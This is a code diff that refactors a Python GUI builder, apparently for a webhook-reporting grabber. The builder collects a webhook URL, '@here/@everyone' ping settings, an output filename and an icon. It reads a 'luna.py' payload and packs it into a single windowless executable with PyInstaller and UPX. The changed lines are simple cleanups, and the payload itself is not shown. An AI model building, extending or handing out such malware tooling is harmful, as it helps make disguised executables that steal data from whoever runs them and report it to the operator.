@@ -240,10 +240,7 @@ class App(customtkinter.CTk):
         webhook = self.webhook_button.get()
         try:
             with requests.get(webhook) as r:
-                if r.status_code == 200:
-                    return True
-                else:
-                    return False
+                return r.status_code == 200
         except Exception:
             return False
 
@@ -320,10 +317,10 @@ class App(customtkinter.CTk):
             elif checkbox.get() == 0:
                 self.updated_dictionary[key] = False
             elif self.ping.get() == 1:
-                if self.pingtype.get() == "Here":
-                    self.updated_dictionary["pingtype"] = "Here"
-                elif self.pingtype.get() == "Everyone":
-                    self.updated_dictionary["pingtype"] = "Everyone"
+                ping_message = self.pingtype.get()
+                if ping_message in ["Here", "Everyone"]:
+                    self.updated_dictionary["pingtype"] = ping_message
+
             elif self.ping.get() == 0:
                 self.updated_dictionary["pingtype"] = "None"
 
@@ -333,10 +330,10 @@ class App(customtkinter.CTk):
             self.updated_dictionary["webhook"] = None
 
     def get_filetype(self):
-        if self.fileopts.get() == ".exe":
-            return "exe"
-        elif self.fileopts.get() == ".py":
-            return "py"
+        file_type = self.fileopts.get()
+        if file_type in [".exe", ".py"]:
+            return file_type.replace(".", "")
+
 
     def reset_check_webhook_button(self):
         self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")
@@ -358,12 +355,12 @@ class App(customtkinter.CTk):
 
     def return_filename(self):
         get_file_name = self.filename.get()
-        if get_file_name == "":
+        if not get_file_name:
             random_name = ''.join(random.choices(string.ascii_letters, k=5))
-            filename = f"test-{random_name}"
+            return f"test-{random_name}"
+
         else:
-            filename = get_file_name
-        return filename
+            return get_file_name
 
     def get_config(self):
         with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
@@ -384,10 +381,12 @@ class App(customtkinter.CTk):
 
     def compile_file(self, filename):
         exeicon = self.icon.get()
-        if exeicon == "":
-            exeicon = "NONE"
-        else:
+        if exeicon:
             exeicon = f"{self.basefilepath}\\{self.icon.get()}.ico"
+
+        else:
+            exeicon = "NONE"
+
         try:
             subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--clean', '--noconsole', '--upx-dir=./tools', '--distpath', './',
                             '--hidden-import', 'base64',
